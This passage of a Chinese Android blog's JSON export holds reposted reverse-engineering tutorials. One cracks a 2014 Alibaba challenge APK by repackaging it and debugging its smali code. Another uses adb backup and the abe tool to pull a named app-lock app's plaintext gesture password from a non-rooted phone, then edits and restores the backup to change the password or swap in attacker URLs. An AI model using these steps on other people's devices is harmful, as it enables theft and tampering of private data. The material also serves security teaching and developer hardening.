ARGB_888。 其他：Glide 可以通过 signature 或不使用本地缓存支持 url 过期 汇总三者总体上来说，ImageLoader 的功能以及代理容易理解长度都一般。 Picasso 代码虽然只在一个包下，没有严格的包区分，但代码简单、逻辑清晰，一两个小时就能叫深入的了解完。 Glide 功能强大，但代码量大、流转复杂。在较深掌握的情况下才推荐使用，免得出了问题难以下手解决。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"AndroidStudio调试smali代码","slug":"AndroidStudio调试smali代码","date":"2017-10-23T12:34:37.000Z","updated":"2020-05-11T07:23:44.556Z","comments":true,"path":"2017/10/23/AndroidStudio调试smali代码/","link":"","permalink":"https://superxlcr.github.io/2017/10/23/AndroidStudio调试smali代码/","excerpt":"","text":"最近看了一篇关于动态调试smali代码的文章：http://blog.csdn.net/superxlcr/article/details/78296673 由于文章是使用Eclipse调试smali代码的，因此上网找了下使用AndroidStudio调试smali代码的相关资料 下载AS插件首先由于AndroidStudio是不支持smali的，因此我们需要下载相关插件来语法高亮以及设置断点我们可以下载smalidea插件来安装：https://bitbucket.org/JesusFreke/smali/downloads/ 安装完后，smali语法会高亮显示，并且可以设置断点了 反编译apk文件利用apktool工具反编译apk，下载地址：https://bitbucket.org/iBotPeaches/apktool/downloads/ 设置AndroidManifest中的debuggable属性为true，并重新打包签名为了让我们的apk可以用于调试，我们需要修改AndroidManifest中的debuggable属性为true： 接着我们可以通过AndroidManifest找到程序的入口Activity（通过android.intent.action.MAIN，android.intent.category.LAUNCHER等属性） 找到程序入口后，我们有两种方法用于调试： 在入口Activity中加入：1invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V 这个是smali语法，对应的Java代码为： 1android.os.Debug.waitForDebugger(); 或者在启动Activity时使用am指令，带上-D参数用于调试：1adb shell am start -D -n package/MainActivity 接着使用apktool重新打包，并使用jarsigner签名 安装apk，开启调试模式，使用AS进行远程attach调试安装完apk后，如果加入了waitForDebugger方法，则直接启动app若是没有加入，则使用am的debug模式启动app 启动完后，打开ddms，查看应用的debug端口号： 如上图所示，红色小蜘蛛代表应用等待调试，其中应用进程号为10747，debug端口号为8620或者8700（一般用前面那个） 然后我们打开AS，导入我们的反编译工程后，在相应的smali代码中打上断点： 上图为在MainActivity的onCreate方法中加入断点 然后，打开AS的Run -&gt; Edit Configurations，新建remote类型： 选择attach模式，输入相应的端口号即可： 调试成功：","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"Android逆向之旅---动态方式破解apk前奏篇(Eclipse动态调试smail源码)","slug":"Android逆向之旅-动态方式破解apk前奏篇-Eclipse动态调试smail源码","date":"2017-10-20T08:13:54.000Z","updated":"2020-05-11T07:23:44.621Z","comments":true,"path":"2017/10/20/Android逆向之旅-动态方式破解apk前奏篇-Eclipse动态调试smail源码/","link":"","permalink":"https://superxlcr.github.io/2017/10/20/Android逆向之旅-动态方式破解apk前奏篇-Eclipse动态调试smail源码/","excerpt":"","text":"本文转载自：http://blog.csdn.net/jiangwei0910410003/article/details/51456735 前言今天我们开始apk破解的另外一种方式：动态代码调试破解，之前其实已经在一篇文章中说到如何破解apk了：Android中使用静态方式破解Apk 主要采用的是静态方式，步骤也很简单，首先使用apktool来反编译apk，得到smail源码，然后分析smail代码，采用代码注入技术来跟踪代码，然后找到关键方法进行修改，进而破解，同时还可以使用一些开源的hook框架，比如：Xposed和Cydia Substrate，来进行关键方法的hook。所以这里我们可以看到我们破解的第一步是使用apktool来进行成功的反编译，然后是需要了解smali语法，不过关于smali语法其实很简单，网上有很多教程。 知识概要分析那么今天我们就用另外一种方式来破解apk：动态方式，关于动态方式其实很广义的，因为动态方式相对于静态方式来说，难度大一点，但是他比静态方式高效点，能够针对更过的破解范围。当然动态方式很多，所以这里就分为三篇文章来讲解这块： 动态方式破解apk前奏篇(Eclipse动态调试smail源码) 动态方式破解apk升级篇(IDA动态调试so源码) 动态方式破解apk终极篇(应对加固的apk破解方法) 从这三篇文章能够让我们破解一般的apk没有任何问题，不过不能代表能够破解所有的apk，因为没有绝对的安全，也是没有绝对的破解，两方都在进步，我们只能具体问题具体分析。好了，下面我们就来看第一篇文章，也是今天的重点：Eclipse动态调试smali源码首先需要解释一下，这里为什么说是调试smali源码，不是Java源码，因为我们弄过反编译的人知道，使用apktool反编译apk之后，会有一个smali文件夹，这里就存放了apk对应的smali源码，关于smali源码这里不解释了，网上有介绍。 案例分析因为这一篇是一个教程篇，所以不能光说，那样会很枯燥的，所以这里用一个例子来介绍一下：我们就用阿里2014年安全挑战赛的第一题：AliCrack_one.apk 看到这张图了，阿里还挺会制造氛围的，那么其实很简单，我们输入密码就可以破解了，下面我们就来看看如何获取这个密码。 使用apktool来破解apk1java -jar apktool_2.0.0rc4.jar d -d AliCraceme_1.apk -o out 这里的命令不做解释了，但是有一个参数必须带上，那就是：-d因为这个参数代表我们反编译得到的smali是java文件，这里说的文件是后缀名是java，如果不带这个参数的话，后缀名是smali的，但是Eclipse中是不会识别smali的，而是识别java文件的，所以这里一定要记得加上这个参数。反编译成功之后，我们得到了一个out目录，如下： 源码都放在smali文件夹中，我们进入查看一下文件： 看到了，这里全是Java文件的，其实只是后缀名为java了，内容还是smali的： 修改AndroidManifest.xml中的debug属性和在入口代码中添加waitDebug上面我们反编译成功了，下面我们为了后续的调试工作，所以还是需要做两件事： 修改AndroidManifest.xml中的android:debuggable=”true” 关于这个属性，我们前面介绍run-as命令的时候，也提到了，他标识这个应用是否是debug版本，这个将会影响到这个应用是否可以被调试，所以这里必须设置成true。2. 在入口处添加waitForDebugger代码进行调试等待。这里说的入口处，就是程序启动的地方，就是我们一般的入口Activity，查找这个Activity的话，方法太多了，比如我们这里直接从上面得到的AndroidManifest.xml中找到，因为入口Activity的action和category是固定的。 当然还有其他方式，比如aapt查看apk的内容方式，或者是安装apk之后用adb dumpsys activity top命令查看都是可以的。找到入口Activity之后，我们直接在他的onCreate方法的第一行加上waitForDebugger代码即可，找到对应的MainActivity的smali源码：然后添加一行代码： 1invoke-static &#123;&#125;, Landroid/os/Debug;-&amp;gt;waitForDebugger()V 这个是smali语法的，其实对应的Java代码就是：android.os.Debug.waitForDebugger(); 这里把Java语言翻译成smali语法的，不难，网上有smali的语法解析，这里不想再解释了。 回编译apk并且进行签名安装1java -jar apktool_2.0.0rc4.jar b -d out -o debug.apk 还是使用apktool进行回编译 编译完成之后，将得到debug.apk文件，但是这个apk是没有签名的，所以是不能安装的，那么下面我们需要在进行签名，这里我们使用Android中的测试程序的签名文件和sign.jar工具进行签名： 关于签名的相关知识，可以看这篇文章：Android中的签名机制详解 1java -jar .\\sign\\signapk.jar .\\sign\\testkey.x509.pem .\\sign\\testkey.pk8 debug.apk debug.sig.apk 签名之后，我们就可以进行安装了。 在Eclipse中新建一个Java工程，导入smali源码这里我们新建一个Java工程，记住不是Android工程，因为我们最后调试其实是借助于Java的调试器，然后勾选掉Use default location选项，选择我们的smali源码目录，也就是我们上面反编译之后的out目录，点击完成 我们导入源码之后的项目工程结构： 主要看MainActivity类： 找到关键点，然后打断点这一步我们看到，其实说的比较广义了，这个要具体问题具体分析了，比如这个例子中，我们知道当我们输入密码之后，肯定要点击按钮，然后触发密码的校验过程，那么这里我们知道找到这个button的定义的地方，然后进入他的点击事件中就可以了。这里分为三步走： 使用Eclipse自带的View分析工具找到Button的ResId 点击之后，需要等待一会，分析View之后的结果： 看到了，这里我们能够看到整个当前的页面的全部布局，已经每个控件的属性值，我们需要找到button的resource-id这里我们看到定义是@+id/button这个值。2. 我们得到这个resId之后，能否在smali工程中全局搜索这个值，就可以定位到这个button的定义的地方呢？ 然后我们看看搜到的结果： 这时候我们其实是在资源文件中搜到了这个id的定义，这个id值对应的是0x7F05003E。当然除了这种方式，我们还有一种方式能快速找到这个id对应的整型值，那就是在反编译之后的values/public.xml文件中： 这个文件很有用的，他是真个apk中所有资源文件定义的映射内容，比如drawable/string/anim/attr/id 等这些资源文件定义的值，名字和整型值对应的地方： 这个文件很重要，是我们在寻找突破口的重要关键，比如我们有时候需要通过字符串内容来定位到关键点，这里就可以通过string的定义来找到对应的整型值即可。当我们找到了button对应的id值了之后，我们就可以用这个id值在一次全局搜索一下，因为我们知道，Android中编译之后的apk，在代码中用到的resId都是用一个整型值代替的，这个整型值就是在R文件中做了定义，将资源的id和一个值对应起来，然后代码里面一般使用R.id.button这样的值，在编译出apk的时候，这个值就会被替换成对应的整型值，所以在全局搜索0x7F05003E 搜索的结果如下： 看到了，这里就定位到了代码中用到的这个button，我们进入代码看看： 在这里，看到了，使用了findViewById的方式定义Button,我们在往下面简单分析一下smali语法，下面是给button添加一个按钮事件，这里用的是内部类MainActivity$1，我们到这个类看看，他肯定实现了OnClickListener接口，那么直接搜onClick方法： 在这里我们就可以下个断点了，这里就是触发密码校验过程。 运行程序，设置远程调试工程在第五步中，我们找到了关键点，然后打上断点，下面我们就来运行程序，然后在Eclipse中设置远程调试的工程首先我们运行程序，因为我们加入了waitForDebug的代码，所以启动的时候会出现一个Wait debug的对话框。不过，我测试的时候，我的手机没有出现这个对话框，而是一个白屏，不过这个不影响，程序运行起来之后，我们看看如何在Eclipse中设置远程调试工程，首先我们找到需要调试的程序对应远程调试服务端对应的端口： 这里我们看到有几个点： 在程序等待远程调试服务器的时候，前面会出现一个红色的小蜘蛛 在调试服务端这里我们会看到两个端口号：8600/8700，这里需要解释一下，为什么会有两个端口号呢？首先在这里的端口号，代表的是，远程调试服务器端的端口，下面在简单来看一下，Java中的调试系统： 这里我们看到，这里有三个角色： JDB Client端(被调试的客户端)，这里我们可以认为我们需要破解的程序就是客户端，如果一个程序可以被调试，当启动的时候，会有一个jdwp线程用来和远程调试服务端进行通信 这里我们看到，我们需要破解的程序启动了JDWP线程，注意这个线程也只有当程序是debug模式下才有的，也就是AndroidManifest.xml中的debug属性值必须是true的时候，也就是一开始为什么我们要修改这个值的原因。2. JDWP协议(用于传输调试信息的，比如调试的行号，当前的局部变量的信息等)，这个就可以说明，为什么我们在一开始的时候，反编译成java文件，因为为了Eclipse导入能够识别的Java文件，然后为什么能够调试呢？因为smali文件中有代码的行号和局部变量等信息，所以可以进行调试的。3. JDB Server端(远程调试的服务端，一般是有JVM端)，就是开启一个JVM程序来监听调试端，这里就可以认为是本地的PC机，当然这里必须有端口用来监听，那么上面的8600端口就是这个作用，而且这里端口是从8600开始，后续的程序端口后都是依次加1的，比如其他调试程序： 那么有了8600端口，为什么还有一个8700端口呢？他是干什么的？其实他的作用就是远程调试端备用的基本端口，也就是说比如这里的破解程序，我们用8600端口可以连接调试，8700也是可以的，但是其他程序，比如demo.systemapi他的8607端口可以连接调试，8700也是可以的： 所以呀，可以把8700端口想象成大家都可以用于连接调试的一个端口，不过，在实际过程中，还是建议使用程序独有的端口号8600，我们可以查看8600和8700端口在远程调试端(本地pc机)的占用情况： 看到了，这里的8600端口和8700端口号都是对应的javaw程序，其实javaw程序就是启动一个JVM来进行监听的。好了，到这里我们就弄清楚了，Java中的调试系统以及远程调试的端口号。注意：其实我们可以使用adb jdwp命令查看，当前设备中可以被调试的程序的进程号信息： 下面继续，我们知道了远程调试服务端的端口：8600，以及ip地址，这里就是本地ip：localhost/127.0.0.1我们可以在Eclipse中新建一个远程调试项目，将我们的smali源码工程和设备中需要调试的程序关联起来：右击被调试的项目=》选择Debug Configurations： 然后开始设置调试项目 选择Romote Java Application，在Project中选择被调试的smali项目，在Connection Type中选择SocketAttach方式，其实还有一种方式是Listener的，关于这两种方式其实很好理解： Listner方式：是调试客户端启动就准备好一个端口，当调试服务端准备好了，就连接这个端口进行调试 Attach方式：是调试服务端开始就启动一个端口，等待调试端来连接这个端口 我们一般都是选择Attach方式来进行操作的。好了，我们设置完远程调试的工程之后，开始运行，擦发现，设备上的程序还是白屏，这是为什么呢？看看DDMS中调试程序的状态： 擦，关联到了这个进程，原因也很简单，我们是上面使用的是8700端口号，这时候我们选中了这个进程，所以就把smali调试工程关联到了这个进程，所以破解的进程没反应了，我们立马改一下，用8600端口： 好了，这下成功了，我们看到红色的小蜘蛛变成绿色的了，说明调试端已经连接上远程调试服务端了。注意：我们在设置远程调试项目的时候，一定要注意端口号的设置，不然没有将调试项目源码和调试程序关联起来，是没有任何效果的 开始运行调试程序，进入调试下面我们就开始操作了，在程序的文本框中输入：gggg内容，点击开始： 好了，到这里我们看到期待已久的调试界面出来了，到了我们开始的时候加的断点处，这时候我们就可以开始调试了，使用F6单步调试，F5单步跳入，F7单步跳出进行操作： 看到了，这里使用v3变量保存了我们输入的内容 这里有一个关键的地方，就是调用MainActivity的getTableFromPic方法，获取一个String字符串，从变量的值来看，貌似不是规则的字符串内容，这里先不用管了，继续往下走： 这里又遇到一个重要的方法：getPwdFromPic，从字面意义上看，应该是获取正确的密码，用于后面的密码字符串比对。 查看一下密码的内容，貌似也是一个不规则的字符串，但是我们可以看到和上面获取的table字符串内容格式很像，接着往下走： 这里还有一个信息就是，调用了系统的Log打印，log的tag就是v6保存的值：lil 这时候，我们看到v3是保存的我们输入的密码内容，这里使用utf-8获取他的字节数组，然后传递给access$0方法，我们使用F5进入这个方法： 在这个方法中，还有一个bytesToAliSmsCode方法，使用F5进入： 那么这个方法其实看上去还是很简单的，就是把传递进来的字节数组，循环遍历，取出字节值，然后转化成int类型，然后在调用上面获取到的table字符串的chatAt来获取指定的字符，使用StringBuilder进行拼接，然后返回即可。 按F7跳出，查看，我们返回来加密的内容是：日日日日，也就是说gggg=&gt;日日日日 最后再往下走，可以看到是进行代码比对的工作了。 那么上面我们就分析完了所有的代码逻辑，还不算复杂，我们来梳理一下流程： 调用MainActivity中的getTableFromPic方法，获取一个table字符串我们可以进入看看这个方法的实现：这里可以大体了解了，他是读取asset目录下的一个logo.png图片，然后获取图片的字节码，在进行操作，得到一个字符串，那么我们从上面的分析可以知道，其实这里的table字符串类似于一个密钥库。 通过MainActivity中的getPwdFromPic方法，获取正确的密码内容 获取我们输入内容的utf-8的字节码，然后调用access$0方法，获取加密之后的内容 access$0方法中在调用bytesToAliSmsCode方法，获取加密之后的内容这个方法是最核心的，我们通过分析知道，他的逻辑是，通过传递进来的字节数组，循环遍历数组，拿到字节转化成int类型，然后在调用密钥库字符串table的charAt得到字符，使用StringBuilder进行拼接。通过上面的分析之后，我们知道获取加密之后的输入内容和正确的密码内容做比较，那么我们现在有的资源是： 密钥库字符串和正确的加密之后的密码，以及加密的逻辑那么我们的破解思路其实很简单了，相当于，我们知道了密钥库字符串，也知道了，加密之后的字符组成的字符串，那么可以通过遍历加密之后的字符串，循环遍历，获取字符，然后再去密钥库找到指定的index，然后在转成byte,保存到字节数组，然后用utf-8获取一个字符串，那么这个字符串就是我们要的密码。下面我们就用代码来实现这个功能： 代码逻辑，很简单吧，其实这个函数相当于上面加密函数的bytesToAliSmsCode的反向实现，运行结果： OK，得到了正确的密码，下面来验证一下： 哈哈，不要太激动，成功啦啦~~。破解成功。 补充：刚刚我们在断点调试的时候，看到了代码中用了Log来打印日志，tag是lil，那么我们可以打印这个log看看结果： 看到了，这里table是密钥库，pw是正确的加密之后的密码，enPassword是我们输入之后加密的密码。所以从这里可以看到，这个例子，其实我们在破解apk的时候，有时候日志也是一个非常重要的信息。 破解需要的资料，我已经上传了，下载地址：http://download.csdn.net/detail/jiangwei0910410003/9526113 思路整理 我们通过apktool工具进行apk的反编译，得到smali源码和AndroidManifest.xml，然后修改AndroidManifest.xml中的debug属性为true，同时在入口处加上waitForDebug代码，进行debug等待，一般入口都是先找到入口Activity，然后在onCreate方法中的第一行这里需要注意的是，apktool工具一定要加上-d参数，这样反编译得到的文件是java文件，这样才能够被Eclipse识别，进行调试。 修改完成AndroidManifest.xml和添加waitForDebug之后，我们需要在使用apktool进行回编译，回编译之后得到的是一个没有签名的apk，我们还需要使用signapk.jar来进行签名，签名文件直接使用测试程序的签名文件就可以，最后在进行安装。 然后我们将反编译之后的smali源码导入到Eclipse工程中，找到关键点，进行下断点，这里的关键点，一般是我们先大致了解程序运行的结构，然后找到我们需要破解的地方，使用View分析工具，或者是使用jd-gui工具直接查看apk源码(使用dex2jar将dex文件转化成jar文件，然后用jd-gui进行查看)，找到代码的大体位置。然后下断点，这里我们可以借助Eclipse的DDMS自带的View分析工具找到对应控件的resid，然后在全局搜索这个控件的resid，或者直接在values/public.xml中查找，最终定位到这个控件位置，在查看他的点击事件即可。 设置远程调试工程，首先运行需要调试程序，然后在DDMS中找到对应的调试服务端的端口号，然后在Debug Configurations中设置远程调试项目，设置对应的调试端口和ip地址(一般都是本机pc,那就是localhost)，然后红色小蜘蛛变成绿色的，表示我们的远程调试项目连接关联上了调试程序，这里需要注意的是，一定需要关联正确，不然是没有任何效果的，关联成功之后，就可以进行操作。 操作的过程中，会进入到关键的断点处，通过F6单步，F5单步进入，F7单步跳出，来进行调试，找到关键方法，然后通过分析smali语法，了解逻辑，如果逻辑复杂的，可以通过查看具体的环境变量的值来观察，这里也是最重要的，也是最复杂的，同时这里也是没有规章可寻的，这个和每个人的逻辑思维以及破解能力有关系，分析关键的加密方法是需要功底的，当然这里还需要注意一个信息，就是Log日志，有时候也是很重要的一个信息。 最后一般当我们知道了核心方法的逻辑，要想得到正确的密码，还是需要自己用语言去实现逻辑的，比如本文中的加密方法，我们需要手动的code一下加密的逆向方法，才能得到正确的密码。 遗留问题 使用apktool工具进行反编译有时候并不是那么顺利，比如像这样的报错：这个一般都是apktool中解析出现了错误，其实这个都是现在apk为了抵抗apktool，做的apk加固策略，这个后面会写一篇文章如何应对这些加固策略，如何进行apk修复，其实原理就是分析apktool源码，找到指定的报错位置，进行apktool代码修复即可。 本文中说到了Java的调试系统，但是为了篇幅限制，没有详细的讲解了整个内容，后面会写一篇文章具体介绍Java中的调试系统以及Android的调试系统。 有时候我们还会遇到回编译成功了，然后遇到运行不起来的错误，这个就需要使用静态方式先去分析程序启动的逻辑，看看是不是程序做了什么运行限制，比如我们在静态分析那篇文章中，提到了应用为了防止反编译在回编译运行，在程序的入口处作了签名校验，如果校验失败，直接kill掉自己的进程，退出程序了，所以这时候我们还是需要使用静态方式去分析apk。 如何做到不修改AndroidManifest.xml中的debug属性就可以进行调试： 修改boot.img,从而打开系统调试，这样就可以省去给app添加android:debuggable=”true”，再重打包的步骤了。 直接修改系统属性，使用setpropex工具在已经root的设备上修改只读的系统属性。使用此工具来修改ro.secure和ro.debuggable的值。这个也会在后面详细介绍这两种方法 总结这篇文章我们就介绍了如何使用Eclipse去动态调试反编译之后的smali源码，这种方式比静态方式高效很多的，比如本文中的这个例子，其实我们也可以使用静态方式进行破解的，但是肯定效率没有动态方式高效，所以以后我们又学会了一个技能，就是动态的调试smali源码来跟踪程序的核心点，但是现在市场上的大部分应用没有这么简单就破解了，比如核心的加密算法放到了native层去做，那么这时候就需要我们去动态调试so文件跟踪，这个是我们下一篇文章的内容，也有的时候，apk进行加固了，直接在apktool进行反编译就失败了，这时候我们就需要先进行apk修复，然后才能后续的操作，这个是我们下下篇的文章，如何应对apk的加固策略。通过这篇文章我们可以看到动态方式破解比静态方式高效的多，但是有时候我们还需要使用静态方式先做一些准备工作，所以在破解apk的时候，动静结合，才能做到完美的破解。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"Android逆向之旅---Android中如何获取在非Root设备中获取应用隐私数据","slug":"Android逆向之旅-Android中如何获取在非Root设备中获取应用隐私数据","date":"2017-10-20T07:43:34.000Z","updated":"2020-05-11T07:23:44.613Z","comments":true,"path":"2017/10/20/Android逆向之旅-Android中如何获取在非Root设备中获取应用隐私数据/","link":"","permalink":"https://superxlcr.github.io/2017/10/20/Android逆向之旅-Android中如何获取在非Root设备中获取应用隐私数据/","excerpt":"","text":"本文转载自：http://blog.csdn.net/jiangwei0910410003/article/details/51437659 前言今天在开发的过程中遇到一个问题，就是关于AndroidManifest.xml中的allowBackup属性，也算是自己之前对这个属性的不了解，加上IDE的自动生成代码，没太注意这个属性，但是没想到这个属性会直接导致隐私数据的丢失。下面就来看一下这个属性的影响到底有多大。他的作用是什么？ Android中的allowBackup属性allowBackup安全风险描述Android API Level 8及其以上Android系统提供了为应用程序数据的备份和恢复功能，此功能的开关决定于该应用程序中AndroidManifest.xml文件中的allowBackup属性值[1] ，其属性值默认是true。当allowBackup标志为true时，用户即可通过adb backup和adb restore来进行对应用数据的备份和恢复，这可能会带来一定的安全风险。Android属性allowBackup安全风险源于adb backup容许任何一个能够打开USB 调试开关的人从Android手机中复制应用数据到外设，一旦应用数据被备份之后，所有应用数据都可被用户读取；adb restore容许用户指定一个恢复的数据来源（即备份的应用数据）来恢复应用程序数据的创建。因此，当一个应用数据被备份之后，用户即可在其他Android手机或模拟器上安装同一个应用，以及通过恢复该备份的应用数据到该设备上，在该设备上打开该应用即可恢复到被备份的应用程序的状态。尤其是通讯录应用，一旦应用程序支持备份和恢复功能，攻击者即可通过adb backup和adb restore进行恢复新安装的同一个应用来查看聊天记录等信息；对于支付金融类应用，攻击者可通过此来进行恶意支付、盗取存款等；因此为了安全起见，开发者务必将allowBackup标志值设置为false来关闭应用程序的备份和恢复功能，以免造成信息泄露和财产损失。 allowBackup安全影响范围Android API Level 8以及以上系统 allowBackup安全风险详情 allowBackup风险位置：AndroidMannifest.xml文件android:allowBackup属性 allowBackup风险触发前提条件：未将AndroidMannifest.xml文件中的android:allowBackup属性值设为false allowBackup风险原理：当allowBackup标志值为true时，即可通过adb backup和adb restore来备份和恢复应用程序数据 如何在非root设备上获取隐私数据好了，上面我们就了解了，原来allowBackup属性的风险很大。下面我们看看现在如果这个属性是false的话，我们怎么在没有root的设备去获取数据呢？首先我们看这样一个场景，现在市场上有一些应用锁类的app，他们就是给每个应用打开的时候添加一个密码，在打开app的时候需要输入密码才能进入指定的应用，一般会把自己的银行app，通讯类的app加密。现在市场上这些应用锁的原理也很简单，一般是三种方式实现： 最古老的方式，启动一个Service然后隔一段时间去轮训，获取当前的topActivity，然后进行操作。 因为Android5.0以后，获取当前的topActivity需要授权，所以这里还需要做一个操作就是引导用户去开一些功能。 通过辅助功能，可以监听当前Window的变化，这种方式比上面的轮训方式高效的多了。 其实1和2两种方式差不多，唯一的区别就在于获取topActivity的方式，其实google意识到了，获取topActivity是很危险的一件事：在之前的一篇文章中说到了：Android中通过应用锁盗取账号，恶意的软件，可以通过这个功能，使用一个类似于QQ或者支付宝这样的app，当用户启动QQ或者支付宝的时候，我们可以监听到，然后就启动我们自己的模拟QQ或者支付宝的登录页面然后就可以获取到用户名和密码了，完成盗取。下面我们来看一个市场上比较火的一款应用锁app：智能应用锁 我们下载apk，之后使用aapt查看他的AndroidManifest.xml内容：aapt dump xmltree applock.apk AndroidManifest.xml &gt; D:\\demo.txt注：我们在拿到一个apk的时候，如果想知道apk中的一些资源和配置信息，aapt命令是个不错的选择，同时，他能够删除apk中的一些资源，添加一些资源到apk中都是可以的。 这里因为AndroidManifest.xml内容有点多，就重定向到一个txt文件中，我们看到allowBackup属性为true，因为非0的都是true。好吧，说明applock.apk这个应用咋们是可以使用adb backup命令进行隐私数据的备份的。下面咋们就来看一下如何进行备份： 第一步：使用adb backup -f applock.ab com.thinkyeah.smartlockfree 进行数据的备份adb backup [-system|-nosystem] -all [-apk|-noapk] [-shared|-noshared] -f &lt;档案名称&gt; [需要备份的应用包名] [-system|-nosystem]这个指令是告诉adb 在备份时是否要连同系统一起备份 若没有打的话 默认是-system 表示会一起备份系统 注意!若连系统一起备份 在还原的时候会复盖系统档案 对于已经升级后的手机是非常不好的 我不知道在没有ROOT的情况下 adb是否有权限去还原系统档案 但就算如此 还是不建议这样做 因此 -nosystem是建议一定要打上的指令 -all这个指令除非只是要备份单一APP 不然是一定要打上去的 这个是问你是否要备份全部的APP 若有加上-nosystem的指令 那么他就只会备份你目前已经安装上去的APP 而不会连系统APP一起备份 [-apk|-noapk]默认是-noapk 这个的意思是是否连安装的APK一起备份 若为-noapk 则只会备份APK的资料档(像是游戏存盘 设定 之类的) [-shared|-noshared]默认是-noshared 这个会问你是否连手机储存空间或是SD卡的档案一起备份 关于这个应用的包名，我们可以直接从上面dump出来的AndroidManifest.xml中获取即可： 获取包名之后，我们就可以执行命令，我们把导出来的文件保存到当前目录下：applock.ab，注意这里的格式是ab，这个也是Android中备份文件的格式要求。 当我们执行这个命令的时候，设备端会出现一个提示页面： 这时候会提示我们输入备份密码，这里为了简单，不输入，直接点击备份即可。 下面，我们还需要借助一个工具来解析这个ab文件。 第二步：使用android-backup-extractor(abe)工具来解析ab文件这个工具是开源的，用Java语言写的。源码位于：https://github.com/nelenkov/android-backup-extractor这里没有直接下载源码，然后编译了，直接在网上下载了一个编译好的这里我就下载好了，可以从这里下载：http://download.csdn.net/detail/jiangwei0910410003/9523470 用法也很简单： 看到我们使用unpack参数来将ab文件转化成tar文件：java -jar abe.jar unpack applock.ab applock.tar我们在用解压缩软件查看内容： 我们现在如果想知道他的密码，那么可以直接查看SharePreferences文件即可，因为一般都会把密码放到这里保存，不过这是一个非常危险的操作，如果你在不进行加密的话，那更是危险了。 我们查看SmartLockConfig.xml内容： 好吧，被我们猜中了，他尽然把手势密码以明文的方式保存在这里。这里他用的是手势方式加密：03678，代表的应该是一个L： 到这里我们就成功的破解了智能应用锁的加密app的功能，而且是在没有root的情况下。下面来总结一下： 1、这个智能应用锁的app现在在市场的下载量还是蛮高的，已经有100W的下载量了，但是我们看到他的一不留神allowBackup属性设置成true，这样就导致了数据可能被外泄，不过这个属性google不知道怎么去对待他的，他的默认值尽然是true，而且更为有趣的是，在使用各大IDE工具，默认新建的工程之后，这个属性的值也是true 上面就是现在比较常用的两个IDE工具：Eclipse和AndroidStudio，看到当我们新建一个工程的时候，他默认都是把这个属性设置成true的，那么当你不设置设置个属性的时候，也是可以进行备份的，因为默认值也是true的，所以按照google的想法，应该是为了防止数据的丢失，就留了这一个功能。便于用户备份数据。但是这里会隐含一些安全问题，所以我们在开发的时候，如果不去注意这个属性的话，就会吃亏的，所以在开发的过程中一定要记得把这个属性设置成false，特别是非常重要的需要账号登录的app。2、上面分析了智能应用锁的app，并非只是一个案例，其实现在很多app都有这个问题，我们看看豌豆荚app： 他也是没有手动的改变这个属性为false的，所以他的数据也是可以导出来的。再看看优酷视频app： 也是一样，不过像这些app，他们的账号登录密码啥的信息肯定不是放在本地的，而是放到服务端进行验证的，不像应用锁这样的，他不需要联网也是可以进行操作的，所以密码必须放到本地。但是只要有这个属性allowBackup为true的话，就会被查看到沙盒数据，就是不安全的。最后我们再来看看微信5.0版本也有这个问题，不过他在6.0之后已经把allowBackup设置成false了： 这里我们看到他没有设置allowBackup属性，但是刚刚说了，默认值就是true，所以还是可以导出来的，下面我们可以使用上面的导出步骤进行操作： 这里，其实微信他把通讯录和聊天记录，都是保存到db中，但是这个db是进行加密的，然后保存到一个目录下面的，关于这个db加密，其实是需要反编译微信，然后动态调试跟踪代码来破解了，这个后面会写一篇文章详细介绍的，因为我们知道，通讯录和聊天内容是没有网络就可以查看的，那么加解密肯定是放在本地做的，只要是放在本地做的，那么就可以进行破解。不过这里看到微信在后续的版本已经修复了这个问题，6.0版本之后就不能导出来数据了，那么5.0的用户其实还是会受影响的。3、还是回到这个应用锁app中来，其实在这里还是想吐槽一番的，作为下载量蛮高的app，尽然把密码用明文保存到xml中，这种做法其实是对用户的不负责，首先这里完全可以使用MD5来做密码验证就可以了，为何要暴露明文，其次是为何把这么重要的数据保存到xml中，稍微加点难度破解的放到so中也是可以的呀~~4、破解场景：之前我看到好几个同事都下载了这个app，去加密相册app，QQ和微信啥的呀，其实现在看来并没有什么用，当我拿到手机的那一刻，什么都是可以做的，而且不需要root，只需要一个命令就可以了，完全的悄无声息，没法察觉的就看到密码了。5、所以在开发的过程中，我们在最后一步发包的过程中一定要检查一下这个属性是否为false，因为他牵涉到你的太多隐私信息了 补充： 我们可以使用adb backup命令来做一下操作，就是我们在开发过程中，如果遇到手机没有root的，但是又想查看沙盒数据，那么这个也是一种方式，当然我们可以使用run-as命令来操作，不了解run-as的同学可以看这篇文章：Android中的run-as命令使用 但是这个也是一种方式，虽然看上去有点繁琐。 与上面的adb backup命令相对应的还有一个就是adb restore命令，他是用来恢复数据的，具体用法： adb restore applock.ab 这时候也会在客户端出现确认页面： 点击恢复数据即可。那么这里又有一个问题了，现在如果我想改了这个应用锁的密码，其实很简单： 然后在保存成ab文件，然后还原。密码就被修改了。那么比如有些应用它把一些隐私的链接url这样的信息保存到xml中，那就蛋疼了，我们可以导出来数据，然后修改url为我们自己的url，然后在还原，我擦，如果是一些上报，或者是登录的url，我们就可以在这里做手脚，达到我们想要的目的了。 技术概要 分析了现阶段应用锁的原理以及如何使用应用锁来进行账号盗取 使用aapt命令查看apk包中信息 使用adb backup/restore进行应用数据的备份和还原 使用abe工具查看备份文件 我们在备份完数据之后，可以尝试查看一些应用的隐私数据，同时还可以篡改信息，在还原。都是可以的。 在开发过程中对于没有root的设备，adb backup也是可以用来查看开发应用的沙盒数据的，只是过程有点复杂。 